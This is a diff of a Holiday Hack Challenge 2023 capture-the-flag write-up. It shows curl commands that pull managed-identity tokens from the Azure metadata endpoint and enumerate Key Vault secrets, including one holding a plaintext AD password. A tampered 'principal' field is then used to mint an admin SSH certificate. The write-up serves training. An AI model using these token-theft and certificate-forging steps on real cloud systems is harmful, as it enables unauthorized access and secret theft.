@@ -555,13 +555,11 @@ A practical introduction to secure shell certificates and how to upgrade your ex
 <details>
 <summary>Solution</summary>
 
-The tasks gives an idea on how to use SSH certificate to authenticate to a remote server and ADCS Attack.
+The tasks gives an idea on how to use SSH certificate to authenticate to a remote server.
 
 Alabaster introduces his gleaming Azure server at ssh-server-vm.santaworkshopgeeseislands.org. Inspired by ChatNPT's ingenious suggestion to upgrade using SSH certificates, Alabaster is eager to share the magic. 
 
 ${\color{green}"Generate a certificate," he suggests, "use the monitor account to access the host, and let me know if my TODO list is within reach."}$
-
-
  
 1. Let's create a SSH certificate from the machine which would use to access the server.
    
@@ -573,11 +571,11 @@ ${\color{green}"Generate a certificate," he suggests, "use the monitor account t
 <img width="687" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/e6ebc809-4564-4ca3-a6e7-e08a3ad4e852">
 
 
-3. Copy only the necessary portion of the certificate highlighted in blue and now update your exisiting certificate using the new signed pub key
+3. Copy only the necessary portion of the certificate highlighted in blue and now update your exisiting certificate using the new signed pub key.
 
 <img width="950" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/0698166a-fa23-4564-9de6-593bdb47262a">
 
-4. Now SSH to the remote server with the signed Public Key and private key using the monitor account.
+4. Now SSH to the remote server with the private key using the monitor account.
 
 ````
    ┌──(kali㉿kali)-[~/SSHenanigans]
@@ -595,6 +593,7 @@ monitor
 
 6. One  of our previous Task "Azure 101" we found a function app so that could be a good start. 
 
+````
 elf@8db4fd157ccd:~$ az functionapp list  -g northpole-rg1 | less
 
 [
@@ -636,9 +635,7 @@ viders/Microsoft.Web/sites/northpole-ssh-certs-fa",**
       "type": "SystemAssigned",
       "userAssignedIdentities": null
     },
-
-
-
+````
 
 7. Since AZI CLI is not in the host we use CURL and it retured me an error that the authorization header is missing.
   The header should look like: "Authorization: Bearer <your-access-token>"
@@ -674,19 +671,77 @@ monitor@ssh-server-vm:/home$ curl 'http://169.254.169.254/metadata/identity/oaut
 ````
 8. For ease the token has been assigned to a variable az_token and the curl request was sent again, we see a github repo url over there.
 
-# Replace <your-access-token> with your actual Azure AD access token
-
 ````
 monitor@ssh-server-vm:/home$ curl -X GET "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" \
 -H "Authorization: Bearer $az_token" | jq
  ````
 
-GET https://graph.microsoft.com/v1.0/servicePrincipals?$filter=displayName eq '<your-app-name>'
+9. After reading throught the python file the Key vault got me curious and let's find the vault URL probably that's were the TODO List lies. We have the Vault URL by running below command
 
+Reveals Vault URL
+````
+monitor@ssh-server-vm:/usr$ curl -H "Authorization: Bearer $az_token" -X GET "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01" | jq
+````
+Generate a token for vault.azure.net to access content in Vault URL
+````
+monitor@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s | jq
+````
+Reveals Secret path
+````
+monitor@ssh-server-vm:~$ curl -H "Authorization: Bearer $az_vault" -X GET "https://northpole-it-kv.vault.azure.net/secrets?api-version=2016-10-01" | jq
+````
+Reveals secrets in the Vault 
+````
+monitor@ssh-server-vm:~$ curl -H "Authorization: Bearer $az_vault" -X GET "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=2016-10-01" | jq
+````
 
+Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
 
+************ The END this lead me no where for now ***************************************************************
 
+Let's relook again what to do to get the TODO List 🤨
 
+10. I had a look at the function app python code and got curious about "principal". The video of Thomas Bouve gives information about principals and that got me to verify that alabaster has pricipal as admin and monitor has prinicipal as elf. So we have to create a SSH certificate with principal as elf.  
+
+````
+monitor@ssh-server-vm:/etc/ssh/auth_principals$ ls
+alabaster  monitor
+monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster 
+admin
+monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat monitor
+elf
+````
+11. Revisiting the [portal](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) and looked at the response which had a parameter "principal". How about we try the "principal" as admin in the request and see if the response shows the principal as admin.
+
+<img width="740" alt="image" src="https://github.com/Miragle-Hub/Holiday-Hack-Challenge-2023---SANS/assets/128744976/35022dca-21be-4430-83de-90ba915a695f">
+
+Sure, it did now we have a SSH certificate with admin principal so we can SSH as alabaster into the host ssh-server-vm.santaworkshopgeeseislands.org.
+
+12. Modify the exisiting public key with the newly generated public key and SSH into the server as alabaster. List the content in home directory and finally we have the TODO List.
+
+````
+ ┌──(kali㉿kali)-[~/SSHenanigans]
+└─$ ssh -i moni alabaster@ssh-server-vm.santaworkshopgeeseislands.org
+alabaster@ssh-server-vm:~$ 
+````
+````
+┌──(kali㉿kali)-[~/SSHenanigans]
+└─$ ssh -i moni alabaster@ssh-server-vm.santaworkshopgeeseislands.org
+alabaster@ssh-server-vm:~$ ls
+alabaster_todo.md  impacket
+alabaster@ssh-server-vm:~$ cat alabaster_todo.md 
+# Geese Islands IT & Security Todo List
+
+- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
+- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
+- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
+- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
+- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
+- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
+- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
+````
+As per the TODO List Alabster is planning to implement ${\color{green}Gingerbread}$  cookie cache 🍪 
+</details>
 
 
 
